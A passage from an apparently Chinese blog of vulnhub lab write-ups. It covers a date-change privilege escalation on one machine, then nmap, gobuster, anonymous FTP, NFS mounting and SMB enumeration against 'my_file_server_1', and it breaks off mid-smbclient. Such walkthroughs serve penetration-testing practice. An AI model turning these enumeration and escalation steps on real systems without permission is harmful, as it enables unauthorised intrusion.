.viminfo<br>133506 -rw-------  1 broken broken   51 Aug  9  2019 .Xauthority<br>152745 -rw-------  1 broken broken 1.3K Aug  9  2019 .xsession-errors<br>133507 -rw-------  1 broken broken 1.3K Aug  8  2019 .xsession-errors.old<br></code></pre></td></tr></table></figure><p>实际上如果没有 gtfobins，这里靶机本身设计的提权思路并不是 timedatectl shell，从.viminfo 和 .bash_history 中可以看到一个特殊的文件 <code>./password-policy.sh</code>，查看内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">broken@ubuntu:~$ <span class="hljs-built_in">cat</span> /etc/init.d/password-policy.sh<br><span class="hljs-comment">#!/bin/bash</span><br><br>DAYOFWEEK=$(<span class="hljs-built_in">date</span> +<span class="hljs-string">&quot;%u&quot;</span>)<br><span class="hljs-built_in">echo</span> DAYOFWEEK: <span class="hljs-variable">$DAYOFWEEK</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$DAYOFWEEK</span>&quot;</span> -eq 4 ]<br><span class="hljs-keyword">then</span><br>        sudo sh -c <span class="hljs-string">&#x27;echo root:TodayIsAgoodDay | chpasswd&#x27;</span><br><span class="hljs-keyword">fi</span><br><br><br><br><span class="hljs-comment">#if [ &quot;$DAYOFWEEK&quot; == 4 ]</span><br></code></pre></td></tr></table></figure><p>这里代码意为当周四的时候，将 root 的密码改为 TodayIsAgoodDay</p><p>我们可以通过 <code>sudo timedatectl set-time &#39;2023-06-29&#39;</code> 来修改当前时间，使用 <code>sudo reboot</code> 来重启，最后 ssh 重新登录 broken 用户，<code>su</code> 命令使用上述密码切换为root</p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>my_file_server_1 靶机</title>
    <link href="/2023/06/3bf613bad65c.html"/>
    <url>/2023/06/3bf613bad65c.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>MyFileServer，vulnhub 靶机，难度适中，文件服务渗透基本功全面检测，内核提权。samba、nfs、ftp 文件服务渗透基本功的全面检测，更有终极提权心法，体会一下心态崩了之前的优雅吧！-红队笔记</p></blockquote><h1 id="my-file-server-1-靶机"><a href="#my-file-server-1-靶机" class="headerlink" title="my_file_server_1 靶机"></a>my_file_server_1 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.104                         <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-23 06:29 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.104<br>Host is up (0.00013s latency).<br>Not shown: 64641 filtered tcp ports (no-response), 17 filtered tcp ports (host-prohibited), 869 closed tcp ports (reset)<br>PORT      STATE SERVICE<br>21/tcp    open  ftp<br>22/tcp    open  ssh<br>80/tcp    open  http<br>111/tcp   open  rpcbind<br>445/tcp   open  microsoft-ds<br>2049/tcp  open  nfs<br>2121/tcp  open  ccproxy-ftp<br>20048/tcp open  mountd<br>MAC Address: 08:00:27:1B:BD:3C (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 13.31 seconds<br></code></pre></td></tr></table></figure><p>开放了 21,22,80,111,445,2049,2121,20048 端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -O -sC -p21,22,80,111,445,2049,2121,20048 192.168.56.104<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-23 06:32 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.104<br>Host is up (0.00040s latency).<br><br>PORT      STATE SERVICE    VERSION<br>21/tcp    open  ftp        vsftpd 3.0.2<br>| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br>|_drwxrwxrwx    3 0        0              16 Feb 19  2020 pub [NSE: writeable]<br>| ftp-syst: <br>|   STAT: <br>| FTP server status:<br>|      Connected to ::ffff:192.168.56.106<br>|      Logged <span class="hljs-keyword">in</span> as ftp<br>|      TYPE: ASCII<br>|      No session bandwidth <span class="hljs-built_in">limit</span><br>|      Session <span class="hljs-built_in">timeout</span> <span class="hljs-keyword">in</span> seconds is 300<br>|      Control connection is plain text<br>|      Data connections will be plain text<br>|      At session startup, client count was 2<br>|      vsFTPd 3.0.2 - secure, fast, stable<br>|_End of status<br>22/tcp    open  ssh        OpenSSH 7.4 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 75:fa:37:d1:62:4a:15:87:7e:21:83:b9:2f:ff:04:93 (RSA)<br>|   256 b8:db:2c:ca:e2:70:c3:eb:9a:a8:cc:0e:a2:1c:68:6b (ECDSA)<br>|_  256 66:a3:1b:55:ca:c2:51:84:41:21:7f:77:40:45:d4:9f (ED25519)<br>80/tcp    open  http       Apache httpd 2.4.6 ((CentOS))<br>|_http-server-header: Apache/2.4.6 (CentOS)<br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>|_http-title: My File Server<br>111/tcp   open  rpcbind    2-4 (RPC <span class="hljs-comment">#100000)</span><br>| rpcinfo: <br>|   program version    port/proto  service<br>|   100000  2,3,4        111/tcp   rpcbind<br>|   100000  2,3,4        111/udp   rpcbind<br>|   100000  3,4          111/tcp6  rpcbind<br>|   100000  3,4          111/udp6  rpcbind<br>|   100003  3,4         2049/tcp   nfs<br>|   100003  3,4         2049/tcp6  nfs<br>|   100003  3,4         2049/udp   nfs<br>|   100003  3,4         2049/udp6  nfs<br>|   100005  1,2,3      20048/tcp   mountd<br>|   100005  1,2,3      20048/tcp6  mountd<br>|   100005  1,2,3      20048/udp   mountd<br>|   100005  1,2,3      20048/udp6  mountd<br>|   100021  1,3,4      43585/udp   nlockmgr<br>|   100021  1,3,4      47243/tcp6  nlockmgr<br>|   100021  1,3,4      54710/tcp   nlockmgr<br>|   100021  1,3,4      57541/udp6  nlockmgr<br>|   100024  1          41099/tcp   status<br>|   100024  1          43507/udp6  status<br>|   100024  1          53654/tcp6  status<br>|   100024  1          54065/udp   status<br>|   100227  3           2049/tcp   nfs_acl<br>|   100227  3           2049/tcp6  nfs_acl<br>|   100227  3           2049/udp   nfs_acl<br>|_  100227  3           2049/udp6  nfs_acl<br>445/tcp   open  netbios-p Samba smbd 4.9.1 (workgroup: SAMBA)<br>2049/tcp  open  nfs_acl    3 (RPC <span class="hljs-comment">#100227)</span><br>2121/tcp  open  ftp        ProFTPD 1.3.5<br>| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br>|_Can\<span class="hljs-string">&#x27;t get directory listing: ERROR</span><br><span class="hljs-string">20048/tcp open  mountd     1-3 (RPC #100005)</span><br><span class="hljs-string">MAC Address: 08:00:27:1B:BD:3C (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="hljs-string">Device type: general purpose|storage-misc</span><br><span class="hljs-string">Running (JUST GUESSING): Linux 3.X|2.6.X|4.X|5.X (97%), Synology DiskStation Manager 5.X (95%), Netgear RAIDiator 4.X (87%)</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:2.6 cpe:/a:synology:diskstation_manager:5.2 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:netgear:raidiator:4.2.28</span><br><span class="hljs-string">Aggressive OS guesses: Linux 3.4 - 3.10 (97%), Linux 2.6.32 - 3.10 (97%), Linux 2.6.32 - 3.13 (97%), Linux 2.6.39 (97%), Linux 3.10 (97%), Synology DiskStation Manager 5.2-5644 (95%), Linux 2.6.32 (94%), Linux 2.6.32 - 3.5 (92%), Linux 3.0 - 3.1 (91%), Linux 3.2 - 3.10 (91%)</span><br><span class="hljs-string">No exact OS matches for host (test conditions non-ideal).</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string">Service Info: Host: FILESERVER; OS: Unix</span><br><span class="hljs-string"></span><br><span class="hljs-string">Host script results:</span><br><span class="hljs-string">| smb-security-mode: </span><br><span class="hljs-string">|   account_used: guest</span><br><span class="hljs-string">|   authentication_level: user</span><br><span class="hljs-string">|   challenge_response: supported</span><br><span class="hljs-string">|_  message_signing: disabled (dangerous, but default)</span><br><span class="hljs-string">| smb2-time: </span><br><span class="hljs-string">|   date: 2023-06-23T10:32:47</span><br><span class="hljs-string">|_  start_date: N/A</span><br><span class="hljs-string">| smb2-security-mode: </span><br><span class="hljs-string">|   3:1:1: </span><br><span class="hljs-string">|_    Message signing enabled but not required</span><br><span class="hljs-string">|_clock-skew: mean: -1h50m02s, deviation: 3h10m30s, median: -3s</span><br><span class="hljs-string">| smb-os-discovery: </span><br><span class="hljs-string">|   OS: Windows 6.1 (Samba 4.9.1)</span><br><span class="hljs-string">|   Computer name: localhost</span><br><span class="hljs-string">|   NetBIOS computer name: FILESERVER\x00</span><br><span class="hljs-string">|   Domain name: \x00</span><br><span class="hljs-string">|   FQDN: localhost</span><br><span class="hljs-string">|_  System time: 2023-06-23T16:02:46+05:30</span><br><span class="hljs-string"></span><br><span class="hljs-string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 18.59 seconds</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>21 ftp 支持匿名登录，445端口开启，2121也是 ftp 服务，同样支持匿名登陆，2049 nfs，smb 可访问，centos操作系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p21,22,80,111,445,2049,2121,20048 192.168.56.104<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-23 06:56 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.104<br>Host is up (0.00025s latency).<br><br>PORT      STATE SERVICE<br>21/tcp    open  ftp<br>22/tcp    open  ssh<br>80/tcp    open  http<br>|_http-stored-xss: Couldn\<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">|_http-csrf: Couldn\&#x27;</span>t find any CSRF vulnerabilities.<br>|_http-dombased-xss: Couldn\<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">|_http-trace: TRACE is enabled</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|_  /icons/: Potentially interesting folder w/ directory listing</span><br><span class="hljs-string">111/tcp   open  rpcbind</span><br><span class="hljs-string">445/tcp   open  microsoft-ds</span><br><span class="hljs-string">2049/tcp  open  nfs</span><br><span class="hljs-string">2121/tcp  open  ccproxy-ftp</span><br><span class="hljs-string">20048/tcp open  mountd</span><br><span class="hljs-string">MAC Address: 08:00:27:1B:BD:3C (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Host script results:</span><br><span class="hljs-string">| smb-vuln-regsvc-dos: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Service regsvc in Microsoft Windows systems vulnerable to denial of service</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference</span><br><span class="hljs-string">|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes</span><br><span class="hljs-string">|       while working on smb-enum-sessions.</span><br><span class="hljs-string">|_          </span><br><span class="hljs-string">|_smb-vuln-ms10-061: false</span><br><span class="hljs-string">|_smb-vuln-ms10-054: false</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 42.85 seconds</span><br></code></pre></td></tr></table></figure><p>漏洞脚本扫描没什么结果</p><h2 id="Web-服务查看"><a href="#Web-服务查看" class="headerlink" title="Web 服务查看"></a>Web 服务查看</h2><p>80 端口开放了，看一看，不过没什么东西，整个界面包括源代码都没有特殊的信息，只能判断出是个文件服务器</p><p><img src="/pic/6aa85e1fd842b86f75f023a1acf86483_MD5.png"></p><p>目录爆破一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo gobuster <span class="hljs-built_in">dir</span> -u http://192.168.56.104/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t64 -x php,txt,sql,rar<br>===============================================================<br>Gobuster v3.5<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.56.104/<br>[+] Method:                  GET<br>[+] Threads:                 64<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.5<br>[+] Extensions:              php,txt,sql,rar<br>[+] Timeout:                 10s<br>===============================================================<br>2023/06/23 06:41:20 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/readme.txt           (Status: 200) [Size: 25]<br>Progress: 1102362 / 1102805 (99.96%)<br>===============================================================<br>2023/06/23 06:43:42 Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>拿到了一个隐藏文件 <code>readme.txt</code>，打开发现</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">My <span class="hljs-keyword">Password</span> <span class="hljs-keyword">is</span><br>rootroot1<br></code></pre></td></tr></table></figure><p>到这里拿到了一个密码，还不知道到底是什么的密码，所以开始根据之前 ftp，smb，nfs 的信息开始处理（ssh 也纳入考虑，不过需要用户名，因此还是要先从 ftp、smb、nfs 入手）先尝试 ftp 匿名登录、smb 脚本扫描、nfs 挂载</p><h2 id="ftp-匿名登录"><a href="#ftp-匿名登录" class="headerlink" title="ftp 匿名登录"></a>ftp 匿名登录</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ ftp 192.168.56.104<br>Connected to 192.168.56.104.<br>220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [192.168.56.104]<br>Name (192.168.56.104:kali): anonymous<br>331 Anonymous login ok, send your complete email address as your password<br>Password: <br>230 Anonymous access granted, restrictions apply<br>Remote system <span class="hljs-built_in">type</span> is UNIX.<br>Using binary mode to transfer files.<br>ftp&gt; <span class="hljs-built_in">ls</span><br>229 Entering Extended Passive Mode (|||33661|)<br>ftp: Can<span class="hljs-string">&#x27;t connect to `192.168.56.104:33661&#x27;</span>: No route to host<br>ftp&gt; <br>ftp&gt; epsv4 off<br>EPSV/EPRT on IPv4 off.<br>ftp&gt; <span class="hljs-built_in">ls</span><br>227 Entering Passive Mode (192,168,56,104,131,84).<br>ftp: Can<span class="hljs-string">&#x27;t connect to `192.168.56.104:33620&#x27;</span>: No route to host<br>ftp&gt; passive <br>Passive mode: off; fallback to active mode: off.<br>ftp&gt; <span class="hljs-built_in">ls</span><br>200 PORT <span class="hljs-built_in">command</span> successful<br>150 Opening ASCII mode data connection <span class="hljs-keyword">for</span> file list<br>drwxrwxrwx   3 root     root           16 Feb 19  2020 pub<br>226 Transfer complete<br>ftp&gt; <span class="hljs-built_in">cd</span> pub<br>250 CWD <span class="hljs-built_in">command</span> successful<br>ftp&gt; <span class="hljs-built_in">ls</span><br>200 PORT <span class="hljs-built_in">command</span> successful<br>150 Opening ASCII mode data connection <span class="hljs-keyword">for</span> file list<br>drwxr-xr-x   9 root     root         4096 Feb 19  2020 <span class="hljs-built_in">log</span><br>226 Transfer complete<br>ftp&gt; <span class="hljs-built_in">cd</span> <span class="hljs-built_in">log</span><br>250 CWD <span class="hljs-built_in">command</span> successful<br>ftp&gt; <span class="hljs-built_in">ls</span><br>200 PORT <span class="hljs-built_in">command</span> successful<br>150 Opening ASCII mode data connection <span class="hljs-keyword">for</span> file list<br>drwxr-xr-x   2 root     root         4096 Feb 19  2020 anaconda<br>drwxr-x---   2 root     root           22 Feb 19  2020 audit<br>-rw-r--r--   1 root     root         7033 Feb 19  2020 boot.log<br>-rw-------   1 root     root        10752 Feb 19  2020 btmp<br>-rw-r--r--   1 root     root         9161 Feb 19  2020 cron<br>-rw-r--r--   1 root     root        31971 Feb 19  2020 dmesg<br>-rw-r--r--   1 root     root        31971 Feb 19  2020 dmesg.old<br>drwxr-xr-x   2 root     root            6 Feb 19  2020 glusterfs<br>drwx------   2 root     root           39 Feb 19  2020 httpd<br>-rw-r--r--   1 root     root       292584 Feb 19  2020 lastlog<br>-rw-------   1 root     root         3764 Feb 19  2020 maillog<br>-rw-------   1 root     root      1423423 Feb 19  2020 messages<br>drwx------   2 root     root            6 Feb 19  2020 ppp<br>drwx------   4 root     root           43 Feb 19  2020 samba<br>-rw-------   1 root     root        63142 Feb 19  2020 secure<br>-rw-------   1 root     root            0 Feb 19  2020 spooler<br>-rw-------   1 root     root            0 Feb 19  2020 tallylog<br>drwxr-xr-x   2 root     root           22 Feb 19  2020 tuned<br>-rw-r--r--   1 root     root        58752 Feb 19  2020 wtmp<br>-rw-------   1 root     root          100 Feb 19  2020 xferlog<br>-rw-------   1 root     root        18076 Feb 19  2020 yum.log<br>226 Transfer complete<br><br></code></pre></td></tr></table></figure><p>ftp 匿名登陆后，遇到无法回显的问题，借助于搜索解决了，后来想起来红队笔记有提过这件事：<strong>ftp 登录后先使用 <code>binary</code> 命令</strong>，防止某些错误信息。简单查看后发现只有一堆日志信息，从中手动提取出一些用户名，写入 user 文件用于之后爆破使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/myfileserver]<br>└─$ <span class="hljs-built_in">cat</span> user   <br>smbuser<br>smbdata<br>root<br>gluster<br>dbus<br>stapusr<br>stapsys<br>stapdev<br>input<br>systemd-network<br>printadmin<br>wbpriv<br></code></pre></td></tr></table></figure><p>此外，这里我信息收集的敏感度还是不够，secure 日志文件中最后一行有 smbuser 的密码，sshd_config 文件中表明不支持密码登录，并给出了公钥目录</p><h2 id="nfs-挂载"><a href="#nfs-挂载" class="headerlink" title="nfs 挂载"></a>nfs 挂载</h2><p>看看nfs</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ showmount -e 192.168.56.104<br>Export list <span class="hljs-keyword">for</span> 192.168.56.104:<br>/smbdata 192.168.56.0/24<br></code></pre></td></tr></table></figure><p>可以挂载，那就挂载到 kali 上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo mount -t nfs 192.168.56.104:/smbdata /tmp/infosec<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>                                                                                                                    <br>┌──(kali㉿kali)-[~]<br>└─$ <span class="hljs-built_in">cd</span> /tmp/infosec             <br>                                                                                                                    <br>┌──(kali㉿kali)-[/tmp/infosec]<br>└─$ <span class="hljs-built_in">ls</span><br>anaconda  boot.log  cron   dmesg.old  lastlog  messages  samba   spooler      tallylog  wtmp     yum.log<br>audit     btmp      dmesg  glusterfs  maillog  ppp       secure  sshd_config  tuned     xferlog<br><br></code></pre></td></tr></table></figure><p>这不还是刚才那些日志信息吗</p><h2 id="smb-访问"><a href="#smb-访问" class="headerlink" title="smb 访问"></a>smb 访问</h2><p>看看 smb，也可以使用命令 <code>sudo smbmap -H IP</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=smb-enum-shares.nse,smb-enum-users.nse -p445 192.168.56.104<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-23 06:43 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.104<br>Host is up (0.00018s latency).<br><br>PORT    STATE SERVICE<br>445/tcp open  microsoft-ds<br>MAC Address: 08:00:27:1B:BD:3C (Oracle VirtualBox virtual NIC)<br><br>Host script results:<br>| smb-enum-users: <br>|   FILESERVER\smbuser (RID: 1000)<br>|     Full name:   <br>|     Description: <br>|_    Flags:       Normal user account<br>| smb-enum-shares: <br>|   account_used: &lt;blank&gt;<br>|   \\192.168.56.104\IPC$: <br>|     Type: STYPE_IPC_HIDDEN<br>|     Comment: IPC Service (Samba 4.9.1)<br>|     Users: 1<br>|     Max Users: &lt;unlimited&gt;<br>|     Path: C:\tmp<br>|     Anonymous access: READ/WRITE<br>|   \\192.168.56.104\<span class="hljs-built_in">print</span>$: <br>|     Type: STYPE_DISKTREE<br>|     Comment: Printer Drivers<br>|     Users: 0<br>|     Max Users: &lt;unlimited&gt;<br>|     Path: C:\var\lib\samba\drivers<br>|     Anonymous access: &lt;none&gt;<br>|   \\192.168.56.104\smbdata: <br>|     Type: STYPE_DISKTREE<br>|     Comment: smbdata<br>|     Users: 0<br>|     Max Users: &lt;unlimited&gt;<br>|     Path: C:\smbdata<br>|     Anonymous access: READ/WRITE<br>|   \\192.168.56.104\smbuser: <br>|     Type: STYPE_DISKTREE<br>|     Comment: smbuser<br>|     Users: 0<br>|     Max Users: &lt;unlimited&gt;<br>|     Path: C:\home\smbuser\<br>|_    Anonymous access: &lt;none&gt;<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 27.11 seconds<br></code></pre></td></tr></table></figure><p>脚本扫描的结果中有 <code>smbdata</code> 和 <code>smbuser</code>，使用 smbclient 命令行登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ smbclient //192.168.56.104/smbuser<br>Password <span class="hljs-keyword">for</span> [WORKGROUP\kali]:<br>Anonymous login successful<br>tree connect failed: 